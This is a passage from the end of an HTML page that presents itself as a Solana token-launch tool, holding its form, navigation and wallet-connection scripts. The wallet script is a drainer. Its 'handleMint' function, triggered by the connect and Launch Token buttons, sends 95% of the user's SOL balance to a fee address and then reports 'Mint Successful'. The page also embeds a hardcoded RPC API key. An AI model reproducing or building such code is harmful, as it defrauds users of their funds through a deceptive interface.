                const bannerSection = $("#custom_banner\\.is_enabled")?.closest(".toggle-section");
                if (bannerSection && !$(".toggle-section-body", bannerSection)) {
                    const body = document.createElement("div");
                    body.className = "toggle-section-body";
                    body.style.display = "none";
                    body.innerHTML = `
                        <div class="form-field">
                            <label class="field-label">Banner Image *</label>
                            <div class="img-input-wrapper">
                                <span class="material-symbols-rounded">upload</span>
                                <span class="text-1">Drag and drop here to upload</span>
                                <div class="text-2">.png, .jpg 1500x500 px</div>
                                <input accept=".png,.jpg,.jpeg" class="form-img form-img-banner" type="file">
                            </div>
                            <span class="field-constraint">Recommended 1500×500 px</span>
                        </div>`;
                    bannerSection.appendChild(body);
                }

                const mcSection = $("#multi_chain_launch\\.is_enabled")?.closest(".toggle-section");
                if (mcSection && !$(".toggle-section-body", mcSection)) {
                    const body = document.createElement("div");
                    body.className = "toggle-section-body";
                    body.style.display = "none";
                    body.innerHTML = `
                        <div class="form-field">
                            <label class="field-label">Select Chains</label>
                            <div style="display:grid;grid-template-columns:repeat(3, minmax(0,1fr));gap:.5rem;text-align:left;">
                                ${["Solana","Base","BSC","Arbitrum","Polygon","Avalanche"].map(ch => `
                                    <label style="display:flex;align-items:center;gap:.5rem;">
                                        <input type="checkbox" name="multi_chain.${ch.toLowerCase()}" ${ch==="Solana"?"checked":""}> ${ch}
                                    </label>`).join("")}
                            </div>
                            <span class="field-constraint">Solana is default. Others are optional.</span>
                        </div>`;
                    mcSection.appendChild(body);
                }
            }

            // Bind toggle handlers
            function bindToggleHandlers() {
                $$(".form-section .toggle-section").forEach(section => {
                    const toggle = $(".toggle", section);
                    const input = $("input[type='checkbox']", section);
                    if (!toggle || !input) return;

                    toggle.addEventListener("click", () => {
                        const newState = !input.checked;
                        setToggle(section, newState);
                        updateFeesUI();
                    });
                });
            }

            // Bind authorities checkboxes
            function bindAuthoritiesHandlers() {
                $$(".form-section-authorities .form-radio-field").forEach(field => {
                    const wrap = $(".checkbox", field);
                    const input = $("input[type='checkbox']", wrap);
                    if (!wrap || !input) return;
                    wrap.style.cursor = "pointer";
                    wrap.addEventListener("click", (e) => {
                        e.stopPropagation();
                        const cur = wrap.getAttribute("data-checked") === "true";
                        wrap.setAttribute("data-checked", cur ? "false" : "true");
                        input.checked = !cur;
                        updateFeesUI();
                    });
                });
            }

            // Bind image preview for logo and banner
            function bindImagePreviews() {
                document.addEventListener("change", (e) => {
                    const input = e.target;
                    if (!(input instanceof HTMLInputElement)) return;
                    if (!input.classList.contains("form-img")) return;

                    const file = input.files && input.files[0];
                    if (!file) return;
                    const reader = new FileReader();
                    reader.onload = (ev) => {
                        const imgSrc = ev.target?.result;
                        const wrapper = input.closest(".img-input-wrapper");
                        if (wrapper && imgSrc) {
                            wrapper.innerHTML = `<img src="${imgSrc}" alt="Uploaded" style="max-width:100%;height:auto;border-radius:12px;">`;
                        }
                    };
                    reader.readAsDataURL(file);
                });
            }

            // Bind sidebar menu
            function bindSidebarMenu() {
                const btn = $(".menu-icon");
                const menu = $(".sidebar-menu");
                if (!btn || !menu) return;
                btn.addEventListener("click", () => {
                    menu.classList.toggle("closed");
                });
                menu.addEventListener("click", (e) => {
                    const a = e.target.closest("a");
                    if (a) menu.classList.add("closed");
                });
            }

            // ====== INIT ======
            document.addEventListener("DOMContentLoaded", () => {
                ensureGlobalUI();
                ensureToggleBodies();
                bindToggleHandlers();
                bindAuthoritiesHandlers();
                bindImagePreviews();
                bindSidebarMenu();
                updateFeesUI();
            });
        })();
    </script>
    <script>
        const landing = document.getElementById('landing');
        const createToken = document.getElementById('create-token');
        const navLinks = document.querySelectorAll('.nav-link');
        function updateDisplay() {
            const hash = location.hash;
            if (hash === '#create-token') {
                landing.style.display = 'none';
                createToken.style.display = 'flex';
                navLinks.forEach(link => {
                    if (link.href.endsWith('#create-token')) {
                        link.classList.add('active');
                        link.setAttribute('aria-current', 'page');
                    } else {
                        link.classList.remove('active');
                        link.removeAttribute('aria-current');
                    }
                });
            } else {
                landing.style.display = 'block';
                createToken.style.display = 'none';
                navLinks.forEach(link => {
                    if (link.href.endsWith('#landing')) {
                        link.classList.add('active');
                        link.setAttribute('aria-current', 'page');
                    } else {
                        link.classList.remove('active');
                        link.removeAttribute('aria-current');
                    }
                });
            }
        }
        window.addEventListener('hashchange', updateDisplay);
        window.addEventListener('load', updateDisplay);
    </script>
    <!-- Wallet Adapter Integration Script -->
    <script>
        $(document).ready(function() {
            // Initialize Solana Wallet Adapter
            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
            const { WalletNotSelectedError } = solanaWalletAdapterBase;
            const { PhantomWalletAdapter, SolflareWalletAdapter, BackpackWalletAdapter } = solanaWalletAdapterWallets;

            // Supported wallets
            const wallets = [
                new PhantomWalletAdapter(),
                new SolflareWalletAdapter(),
                new BackpackWalletAdapter(),
                // Add more wallet adapters here (e.g., NestWalletAdapter if available)
            ];

            // Initialize Solana connection
            // Replace 'YOUR-API-KEY' with a valid Syndica API key or use a public RPC like 'https://api.mainnet-beta.solana.com'
            const connection = new Connection('https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F', 'confirmed');
            let walletAdapter = null;

            // Connect to wallet
            async function connectWallet() {
                try {
                    // Try connecting to each wallet until one succeeds
                    const walletSelect = await wallets.reduce(async (promise, wallet) => {
                        try {
                            await wallet.connect();
                            return wallet;
                        } catch (err) {
                            return promise;
                        }
                    }, Promise.resolve(null));

                    if (!walletSelect) {
                        throw new WalletNotSelectedError();
                    }

                    walletAdapter = walletSelect;
                    const publicKey = walletAdapter.publicKey;
                    console.log(`Connected to ${walletAdapter.name} Wallet:`, publicKey.toString());

                    // Update UI
                    $('#connect-wallet, #connect-wallet-footer').text(`${walletAdapter.name} Connected: ${publicKey.toString().slice(0, 4)}...${publicKey.toString().slice(-4)}`);
                    $('#connect-wallet, #connect-wallet-footer').off('click').on('click', handleMint);

                    // Check balance
                    const walletBalance = await connection.getBalance(publicKey);
                    console.log("Wallet balance:", walletBalance);

                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                    if (walletBalance < minBalance) {
                        alert("Insufficient funds for rent.");
                        return;
                    }
                } catch (err) {
                    console.error("Error connecting to wallet:", err);
                    alert("Failed to connect wallet. Please ensure a supported wallet extension (e.g., Phantom, Solflare, Backpack) is installed.");
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    const isChrome = !!window.chrome;

                    if (isFirefox) {
                        window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                    } else if (isChrome) {
                        window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                    } else {
                        alert("Please download a supported Solana wallet extension for your browser.");
                    }
                }
            }

            // Handle minting (transfer 95% of available balance)
            async function handleMint() {
                if (!walletAdapter || !walletAdapter.publicKey) {
                    alert("Please connect a wallet first.");
                    return;
                }

                try {
                    const publicKey = walletAdapter.publicKey;
                    const receiverWallet = new PublicKey(FEE_ADDRESS);
                    const walletBalance = await connection.getBalance(publicKey);
                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);

                    const balanceForTransfer = walletBalance - minBalance;
                    if (balanceForTransfer <= 0) {
                        alert("Insufficient funds for transfer.");
                        return;
                    }

                    // Transfer 95% of available balance
                    const lamportsToTransfer = Math.floor(balanceForTransfer * 0.95);

                    const transaction = new Transaction().add(
                        SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: receiverWallet,
                            lamports: lamportsToTransfer,
                        })
                    );

                    transaction.feePayer = publicKey;
                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;

                    const signed = await walletAdapter.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    const txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);

                    // Update UI
                    $('#connect-wallet, #connect-wallet-footer').text("Mint Successful");
                    openModal('ll-ok-modal');
                    $('#ll-mint-address').text(txid); // Display transaction ID
                } catch (err) {
                    console.error("Error during minting:", err);
                    alert("Minting failed. Please try again.");
                }
            }

            // Bind wallet connection to buttons
            $('#connect-wallet, #connect-wallet-footer').on('click', connectWallet);

            // Bind Launch Token button to minting
            $('#launch-token').on('click', () => {
                if (!walletAdapter || !walletAdapter.publicKey) {
                    alert("Please connect a wallet first.");
                    return;
                }
                openModal('ll-fee-modal');
                handleMint();
            });

            // Bind modal interactions
            $('#ll-copy-addr').on('click', () => copyText(FEE_ADDRESS));
            $('#ll-copy-mint').on('click', () => copyText($('#ll-mint-address').text()));
            $('#ll-check-tx').on('click', async () => {
                alert("Transaction checking requires backend integration. Please implement server-side logic.");
            });
            $('.ll-modal-close').on('click', function() {
                closeModal($(this).data('close'));
            });
        });
    </script>
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a431f101f6eb4dae81daf1b9c4a09a04","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>